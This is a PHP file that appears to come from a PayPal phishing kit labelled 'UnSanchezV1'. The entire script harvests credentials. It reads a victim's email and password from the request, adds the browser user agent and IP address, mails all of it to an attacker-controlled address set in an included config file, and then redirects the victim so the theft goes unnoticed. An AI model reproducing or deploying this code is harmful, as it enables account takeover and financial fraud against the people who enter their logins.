<?php
error_reporting(0);
ob_start();
session_start();
include('./info.php');
if($_SESSION['CAPTCHA'] == true){
    $msg = "
==========UnSanchezV1============
Email = ".$_GET['e']."

Password = ".$_GET['p']."

User agent = ".$_SERVER["HTTP_USER_AGENT"]."

Ip = ".$_SERVER['REMOTE_ADDR']."
";
$sub = "❤ [".$_POST['EM']."] ❤ NEW PAYPAL LOGIN".$_SERVER['REMOTE_ADDR'];
$head="From:Any Sanchez <Login>";
mail($enviardatos,$sub,$msg,$head);		
header('location: ./account.php');
}
else{
    header('location: signin.php');
}
?>
